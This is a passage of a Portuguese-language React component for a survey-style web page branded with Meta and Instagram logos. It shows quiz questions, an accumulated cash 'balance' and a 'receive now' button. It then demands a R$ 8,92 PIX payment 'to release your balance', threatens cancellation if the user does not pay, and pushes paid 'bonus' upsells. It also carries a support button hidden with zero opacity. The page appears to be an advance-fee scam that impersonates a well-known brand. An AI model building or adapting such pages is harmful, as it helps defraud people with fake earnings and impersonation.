                          <div className="text-center md:text-right">
                            <div className="mb-2">
                              <span className="text-sm text-gray-500 line-through">R$ {product.originalPrice}</span>
                              <span className="text-2xl font-bold text-purple-600 ml-2">R$ {product.salePrice}</span>
                            </div>
                            <Button className="bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 text-white px-6 py-2 text-sm">
                              Quero Este Bônus
                            </Button>
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>

                <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mt-6">
                  <p className="text-sm text-yellow-700 font-medium">
                    ⏰ Oferta por tempo limitado - Apenas para quem acabou de fazer o pagamento!
                  </p>
                </div>

                <div className="flex flex-col sm:flex-row space-y-3 sm:space-y-0 sm:space-x-4 mt-6">
                  <Button
                    onClick={() => setShowUpsell(false)}
                    variant="outline"
                    className="flex-1 border-gray-300 text-gray-600 hover:text-gray-800"
                  >
                    Não, obrigado
                  </Button>
                  <Button
                    onClick={() => {
                      // Handle upsell purchase
                      alert("Redirecionando para pagamento do upsell...")
                    }}
                    className="flex-1 bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 text-white"
                  >
                    Quero Ambos os Bônus
                  </Button>
                </div>
              </div>
            </div>
          </div>
        ) : showPixStep ? (
          <div className="min-h-screen bg-white flex flex-col">
            <div className="flex-1 flex items-center justify-center px-4 py-8">
              {!pixLoadingComplete ? (
                <div className="text-center space-y-4 w-full max-w-sm">
                  <div className="flex justify-center">
                    <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-pink-500"></div>
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold text-gray-800 mb-2">...</h3>
                    <p className="text-sm text-gray-600">Preparando seu pagamento...</p>
                  </div>
                </div>
              ) : (
                <div className="text-center w-full max-w-sm space-y-4">
                  <div className="mx-auto w-20 h-20 flex items-center justify-center mb-3">
                    <Image
                      src="/images/instagram-logo-official.png"
                      alt="Instagram Logo"
                      width={80}
                      height={80}
                      className="object-contain"
                    />
                  </div>

                  <p className="text-sm mb-2 text-black">Escaneie o QR Code ou copie o código PIX</p>

                  <p className="text-xs text-gray-500 mb-4">
                    <span className="font-bold text-black">
                      Tempo restante: Este Pix expira em {formatTime(timeLeft)}.
                    </span>
                  </p>

                  <p className="text-xs font-medium text-center border-4 border-solid rounded-lg border-[rgba(255,231,15,0)] bg-yellow-100 text-[rgba(108,77,0,1)]">
                    ⚠️ Após realizar o pagamento via PIX, retorne ao site para liberar seu saldo
                  </p>

                  <div className="flex justify-center mb-4">
                    <div className="bg-white p-3 rounded-lg border-2 border-gray-200">
                      <div className="w-32 h-32 bg-gray-100 flex items-center justify-center rounded">
                        {pixPayload && (
                          <img
                            src={`https://api.qrserver.com/v1/create-qr-code/?size=128x128&data=${encodeURIComponent(pixPayload)}`}
                            alt="QR Code PIX"
                            className="w-full h-full object-contain"
                          />
                        )}
                      </div>
                    </div>
                  </div>

                  <div className="space-y-2 mb-4">
                    <p className="text-xs text-gray-600 text-center">Código PIX:</p>
                    <div className="bg-gray-50 p-2 rounded border text-xs font-mono break-all text-center">
                      {pixPayload}
                    </div>
                  </div>

                  <Button
                    onClick={() => {
                      navigator.clipboard.writeText(pixPayload)
                      setPixCopied(true)
                      setTimeout(() => setPixCopied(false), 2000)
                    }}
                    className="w-full hover:[rgba(26,192,68,1)] text-white py-2 text-sm bg-[rgba(26,192,68,1)]"
                  >
                    {pixCopied ? "PIX Copiado!" : "Copiar PIX"}
                  </Button>

                  <div className="text-center pt-2">
                    <p className="text-lg font-bold text-gray-800">R$ 8,92</p>

                    <div className="border border-red-200 rounded-md p-2 mb-4 bg-transparent border-none">
                      <p className="text-xs font-medium text-center border-none text-[rgba(255,2,19,1)]">
                        Lembrando Caso não efetue o pagamento, sua avaliação será anulada e cancelada.
                      </p>
                    </div>

                    <div className="mt-4 mb-4 space-y-3">
                      <div className="flex items-center text-left space-x-3">
                        <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0">
                          <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
                            <path
                              fillRule="evenodd"
                              d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1h.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 01-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z"
                              clipRule="evenodd"
                            />
                          </svg>
                        </div>
                        <p className="text-sm text-gray-600">Abra o app do seu banco e entre no ambiente Pix</p>
                      </div>

                      <div className="flex items-center text-left space-x-3">
                        <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0">
                          <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24">
                            <path
                              fillRule="evenodd"
                              d="M3 4a1 1 0 011-1h3a1 1 0 011 1v3a1 1 0 01-1 1H4a1 1 0 01-1-1v-3zm2 2V5h1v1H5zM3 13a1 1 0 011-1h3a1 1 0 011 1v3a1 1 0 01-1 1H4a1 1 0 01-1-1v-3zm2 2v-1h1v1H5zM13 3a1 1 0 00-1 1v3a1 1 0 001 1h3a1 1 0 001-1V4a1 1 0 00-1-1h-3zm1 2v1h1V5h-1z"
                              clipRule="evenodd"
                            />
                            <path d="M11 4a1 1 0 10-2 0v1a1 1 0 002 0V4zM10 7a1 1 0 011 1v1h2a1 1 0 110 2h-3a1 1 0 01-1-1V8a1 1 0 011-1zM16 12a1 1 0 100-2 1 1 0 000 2zM12 13a1 1 0 011-1h2a1 1 0 110 2h-2a1 1 0 01-1-1V8a1 1 0 011-1zM16 16a1 1 0 100-2 1 1 0 000 2zM16 20a1 1 1 0 100-2 1 1 0 000 2zM12 17a1 1 0 011-1h2a1 1 0 110 2h-2a1 1 0 01-1-1V8a1 1 0 011-1z" />
                          </svg>
                        </div>
                        <p className="text-sm text-gray-600">
                          Escolha <span className="font-medium">Pagar com QR Code</span> e aponte a câmera para o código
                          ao lado
                        </p>
                      </div>

                      <div className="flex items-center text-left space-x-3">
                        <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0">
                          <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
                            <path
                              fillRule="evenodd"
                              d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                              clipRule="evenodd"
                            />
                          </svg>
                        </div>
                        <p className="text-sm text-gray-600">Confirme as informações e finalize sua compra</p>
                      </div>
                    </div>

                    <div className="flex justify-center mt-2">
                      <Image
                        src="/images/security-badges.png"
                        alt="Pagamento Seguro - Privacidade Protegida"
                        width={200}
                        height={40}
                        className="object-contain"
                      />
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        ) : currentQuestion < questions.length ? (
          <div className="flex flex-col h-screen overflow-hidden">
            <div className="flex-1 flex items-center justify-center p-2">
              <div className="w-full max-w-md mx-auto">
                <Card className="w-full bg-white rounded-lg shadow-xl mt-8">
                  <CardHeader className="text-center pt-4 pb-0">
                    <div className="mb-2">
                      <div className="relative h-1.5 w-full overflow-hidden rounded-full bg-gray-200">
                        <div
                          className="h-full transition-all duration-500 ease-out bg-gradient-to-r from-purple-500 via-pink-500 to-orange-400"
                          style={{
                            width: `${((currentQuestion + 1) / questions.length) * 100}%`,
                          }}
                        />
                      </div>
                    </div>
                    <div className="mx-auto w-48 flex items-center justify-center mb-4 h-28">
                      <Image
                        src={getQuestionImage(currentQuestion) || "/placeholder.svg"}
                        alt="Question Image"
                        width={192}
                        height={192}
                        className="object-contain h-28 w-48 rounded-3xl"
                      />
                    </div>
                    <CardTitle className="text-base font-semibold text-gray-800 mb-0">
                      {t.question} {questions[currentQuestion].id}
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="px-3 pb-3">
                    <p className="text-gray-700 text-center leading-tight font-black text-sm mb-4">
                      {getPersonalizedQuestion(currentQuestion, questions[currentQuestion].question)}
                    </p>
                    <div className="space-y-1.5">
                      {questions[currentQuestion].options.map((option, index) => (
                        <Button
                          key={index}
                          onClick={() => handleAnswerSubmit(option)}
                          variant="outline"
                          className="w-full text-left justify-start border-2 border-transparent bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 p-[1px] hover:from-pink-600 hover:via-purple-600 hover:to-orange-500 transition-all duration-200 rounded-lg py-0 px-0 border-none"
                        >
                          <span className="w-full h-full bg-white rounded-md px-2 py-2 text-gray-800 text-center whitespace-normal break-words leading-tight min-h-[40px] flex items-center justify-center text-sm border-solid border border-slate-300">
                            {option}
                          </span>
                        </Button>
                      ))}
                    </div>
                    <div className="text-center mt-2 pt-2 border-t border-gray-100">
                      <p className="text-xs text-gray-500">{t.footerText}</p>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          </div>
        ) : !showPaymentForm ? (
          <div className="flex flex-col min-h-screen">
            <div className="flex-1 flex items-center justify-center">
              <Card className="fixed inset-0 bg-opacity-20 flex items-center justify-center z-50 px-4 bg-transparent border shadow-xl">
                <CardContent className="text-center py-8">
                  <h2 className="text-xl font-semibold text-gray-800 mb-4">{t.thankYou}</h2>
                  <p className="text-gray-600 mb-4">{t.responsesRecorded}</p>
                  <p className="text-gray-700 mb-6 leading-relaxed">{t.qualifiedText}</p>
                  <p className="text-green-600 font-semibold text-lg">
                    {t.finalBalance} R$ {balance.toFixed(2)}
                  </p>
                  <p className="text-sm mt-1 text-[rgba(0,166,62,1)]"></p>
                  <Button
                    className="w-full bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 hover:from-pink-600 hover:via-purple-600 hover:to-orange-500 text-white font-semibold py-4 rounded-lg text-base uppercase tracking-wide transition-all duration-200 mt-6 shadow-xl"
                    onClick={handleReceiveNow}
                  >
                    {t.receiveNow}
                  </Button>
                </CardContent>
              </Card>
            </div>
            <div className="text-center py-4">
              <p className="text-xs text-gray-500">{t.footerText}</p>
            </div>
          </div>
        ) : null}
      </div>
    )
  }

  return (
    <div className="flex-1 flex items-center justify-center p-4 bg-white">
      {/* Meta logo div removed from initial form */}

      <Card className="w-full max-w-xs bg-white -mt-6 rounded-none shadow-none border-none">
        <CardHeader className="text-center pb-4 pt-8">
          <div className="mx-auto w-30 h-30 flex items-center justify-center mb-0">
            <Image
              src="/images/meta-logo.png"
              alt="Instagram Logo"
              width={100}
              height={100}
              className="object-contain"
            />
          </div>
          <CardTitle className="text-2xl font-normal text-gray-800 mb-3">{t.welcome}</CardTitle>
          <CardDescription className="text-gray-600 text-base px-2">{t.fullNameDescription}</CardDescription>
        </CardHeader>
        <CardContent className="px-6 pb-8">
          <form onSubmit={handleSubmit} className="space-y-6">
            <Input
              type="text"
              placeholder={t.fullNamePlaceholder}
              value={fullName}
              onChange={(e) => setFullName(e.target.value)}
              required
              className="w-full px-4 py-4 border border-gray-300 rounded-lg text-center text-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            />
            <Button
              type="submit"
              className="w-full bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 hover:from-pink-600 hover:via-purple-600 hover:to-orange-500 text-white font-semibold py-4 rounded-lg text-base uppercase tracking-wide transition-all duration-200 shadow-xl"
            >
              {t.startResearch}
            </Button>
            <div className="text-xs text-gray-500 text-center px-2 leading-relaxed">
              <p>
                <strong>{t.important}</strong> {t.importantText}
              </p>
            </div>
          </form>
        </CardContent>
      </Card>

      {showSupportWidget && !isSubmitted && (
        <div className="fixed bottom-6 right-6 z-50">
          <div className="relative">
            {showSupportTooltip && (
              <div className="absolute bottom-full right-0 mb-2 w-64 bg-gray-800 text-white text-sm rounded-md shadow-lg p-3 z-10 opacity-0">
                {t.needHelp}
              </div>
            )}
            <button
              onClick={handleSupportClick}
              className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-full shadow-lg transition-colors duration-200 opacity-0"
            >
              {supportIsTyping ? "Digitando..." : "Suporte"}
            </button>
          </div>
        </div>
      )}
    </div>
  )
}
